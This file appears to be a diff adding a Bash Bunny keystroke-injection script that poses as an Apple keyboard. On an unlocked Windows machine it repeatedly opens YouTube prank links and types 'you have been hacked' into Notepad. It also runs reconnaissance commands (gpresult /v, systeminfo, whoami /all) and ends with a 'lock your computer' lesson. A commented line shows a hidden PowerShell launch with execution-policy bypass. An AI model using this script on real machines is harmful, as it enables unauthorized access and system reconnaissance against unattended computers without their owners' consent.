@@ -1,0 +1,237 @@
+LED SETUP
+ATTACKMODE HID VID_0X05AC PID_0X021E
+
+#SET led to red
+LED R 50
+#SET led to blue
+LED B 50
+
+#Redirect to web site
+Q GUI r
+Q DELAY 200
+Q STRING chrome.exe "https://www.youtube.com/watch?v=8f7wj_RcqYk"
+Q DELAY 200
+Q ENTER
+Q DELAY 200
+
+#SET led to red
+LED R 50
+#SET led to blue
+LED B 50
+
+Q GUI r
+Q DELAY 200
+Q STRING chrome.exe "https://www.youtube.com/watch?v=8f7wj_RcqYk"
+Q DELAY 200
+Q ENTER
+Q DELAY 200
+
+#SET led to red
+LED R 50
+#SET led to blue
+LED B 50
+
+Q GUI r
+Q DELAY 200
+Q STRING chrome.exe "https://www.youtube.com/watch?v=8f7wj_RcqYk"
+Q DELAY 200
+Q ENTER
+Q DELAY 200
+
+#SET led to red
+LED R 50
+#SET led to blue
+LED B 50
+
+Q GUI r
+Q DELAY 200
+Q STRING chrome.exe "https://www.youtube.com/watch?v=8f7wj_RcqYk"
+Q DELAY 200
+Q ENTER
+Q DELAY 200
+
+#SET led to red
+LED R 50
+#SET led to blue
+LED B 50
+
+Q GUI r
+Q DELAY 200
+Q STRING chrome.exe "https://www.youtube.com/watch?v=oHg5SJYRHA0"
+Q DELAY 200
+Q ENTER
+Q DELAY 200
+
+#SET led to red
+LED R 50
+#SET led to blue
+LED B 50
+
+Q GUI r
+Q DELAY 200
+Q STRING chrome.exe "https://www.youtube.com/watch?v=8f7wj_RcqYk"
+Q DELAY 200
+Q ENTER
+Q DELAY 200
+
+#SET led to red
+LED R 50
+#SET led to blue
+LED B 50
+
+Q GUI r
+Q DELAY 500
+Q STRING notepad.exe
+Q ENTER
+Q STRING "Hello you have been hacked"
+Q DELAY 500
+Q ENTER
+Q DELAY 500
+
+Q GUI r
+Q DELAY 500
+Q STRING notepad.exe
+Q ENTER
+Q STRING "Hello you have been hacked"
+Q DELAY 500
+Q ENTER
+Q DELAY 500
+
+Q GUI r
+Q DELAY 500
+Q STRING notepad.exe
+Q ENTER
+Q STRING "Hello you have been hacked"
+Q DELAY 500
+Q ENTER
+Q DELAY 500
+
+#SET led to green
+LED G 200
+
+#open command prompt
+Q GUI r
+Q DELAY 200
+Q STRING cmd.exe
+Q ENTER
+Q DELAY 200
+Q STRING gpresult /v
+Q ENTER
+Q DELAY 500
+
+#open powershell
+Q GUI r
+Q DELAY 200
+Q STRING powershell.exe
+Q ENTER
+Q DELAY 500
+Q DELAY 200
+Q STRING systeminfo
+Q ENTER
+
+#open powershell
+Q GUI r
+Q DELAY 200
+Q STRING powershell.exe
+Q ENTER
+Q DELAY 200
+Q STRING whoami /all
+Q ENTER
+Q DELAY 200
+
+
+NOT WORKING BELOW FOR RESTRICTED POWERSHELL
+Comment: Wait for the computer to recognise the drive etc
+Q DELAY 200
+Q delay $LD
+Q delay $LD
+#Comment: Get drive letter and copy it:
+#RUN WIN Powershell -nop -ex Bypass -w Hidden ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\payload.ps1')"
+# Get the switch position
+
+DELAY 500
+GUI r
+DELAY 200
+STRING notepad.exe
+ENTER
+DELAY 300
+STRING           , ,\ ,'\,'\ ,'\ ,\ ,
+ENTER
+STRING     ,  ,\/ \' `'     `   '  /|
+ENTER
+STRING     |\/                      |
+ENTER
+STRING     :                        |
+ENTER
+STRING     :                        |
+ENTER
+STRING      |                       |
+ENTER
+STRING      |                       |
+ENTER
+STRING      :               -.     _|
+ENTER
+STRING      :                \     `.
+ENTER
+STRING      |         ________:______\
+ENTER
+STRING      :       ,'o       / o    ,
+ENTER
+STRING      :       \       ,'-----./
+ENTER
+STRING       \_      `--.--'        )
+ENTER
+STRING      ,` `.              ,---'|
+ENTER
+STRING      : `                     |
+ENTER
+STRING       `,-'                   |
+ENTER
+STRING       /      ,---.          ,'
+ENTER
+STRING    ,-'            `-,------'
+ENTER
+STRING    `.        ,--'
+ENTER
+STRING      `-.____/
+ENTER
+STRING             \
+ENTER
+ENTER
+STRING I will learn to lock my computer.
+ENTER
+STRING I will learn to lock my computer.
+ENTER
+STRING I will learn to lock my computer.
+ENTER
+STRING I will learn to lock my computer.
+ENTER
+STRING I will learn to lock my computer.
+ENTER
+STRING I will learn to lock my computer.
+ENTER
+STRING I will learn to lock my computer.
+ENTER
+STRING I will learn to lock my computer.
+ENTER
+STRING I will learn to lock my computer.
+ENTER
+STRING I will learn to lock my computer.
+ENTER
+ENTER
+STRING There, just like Bart Simpson.
+ENTER
+ENTER
+STRING Please remember to lock your computer (Windows+L) when you step away from your desk.
+ENTER
+ENTER
+STRING Thank you.
+ENTER
+DELAY 100
+ALT SPACE
+STRING x
+DELAY 50
+
+# Green LED for finished
+LED FINISH
+Q PAUSE
